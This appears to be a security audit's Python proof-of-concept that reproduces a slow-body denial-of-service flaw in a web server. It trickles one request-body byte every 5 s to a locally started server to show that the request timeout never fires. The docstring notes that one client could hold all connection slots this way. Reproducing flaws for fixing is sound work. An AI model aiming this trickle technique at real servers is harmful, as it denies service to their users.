#!/usr/bin/env python3
"""R3-4 (round-2 F4, residual): a request body that trickles slower than one
byte per 30 s is held open forever; the request timeout does not cover body
reads.

Round 3 added a 30 s pause timer per body piece (a silent body gets 408) and
a 60 s request timeout, but `read_body` in crates/server/src/connection.rs is
awaited BEFORE the handler task exists, so `--request-timeout` never wraps it:
only the per-piece timer applies. A client sending 1 byte every 5 s is never
"silent" for 30 s, so the connection is held indefinitely. With the 10,000
connections-per-worker cap, one client can hold all slots this way and no
other client is served (the 75 s idle timeout does not fire either, because
the connection is not idle).

This reproducer starts the server with `--request-timeout 10` and trickles one
byte every 5 s for 40 s. If the request timeout covered body reads, the client
would get a 504 at ~10 s; observed: no response and the connection still open
at 40 s.

Safe to run: 8 bytes of body, bounded 45 s, one connection.

Usage: repro_r3_trickle_body.py   (starts its own server)
"""
import os
import select
import shutil
import socket
import sys
import time

from r3 import Server, make_site, report, build_request


def main():
    site = make_site({
        "index.php": "<?php echo 'FRONT';",
        "post.php": "<?php echo json_encode($_POST);",
    })
    server = Server(site, args=["--request-timeout", "10"])
    try:
        t0 = time.time()
        s = socket.create_connection(("127.0.0.1", server.port), timeout=60)
        s.sendall(build_request(
            "POST", "/post.php",
            [("Host", "x"), ("Content-Type", "application/x-www-form-urlencoded"),
             ("Content-Length", "1000000")],
        ))
        s.setblocking(False)
        sent = 0
        answered = None
        last_send = time.time()
        while time.time() - t0 < 40:
            r, _, _ = select.select([s], [], [], 1.0)
            if r:
                try:
                    chunk = s.recv(400)
                except BlockingIOError:
                    chunk = None
                if chunk:
                    answered = (time.time() - t0, chunk[:60])
                    break
                if chunk == b"":
                    answered = (time.time() - t0, b"<closed>")
                    break
            if time.time() - last_send >= 5:
                try:
                    s.sendall(b"a")
                    sent += 1
                    last_send = time.time()
                except BlockingIOError:
                    pass
        s.close()
        if answered:
            evidence = f"trickle answered at {answered[0]:.1f}s: {answered[1]!r}"
            vulnerable = False
        else:
            evidence = (
                f"1 byte every 5 s for 40 s on a server with --request-timeout 10: "
                f"no response, connection still open after {time.time()-t0:.0f}s "
                f"({sent} bytes sent); the request timeout does not cover body reads"
            )
            vulnerable = True
        return report("trickled request body is held past the request timeout", vulnerable, evidence)
    finally:
        server.stop()
        shutil.rmtree(site, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
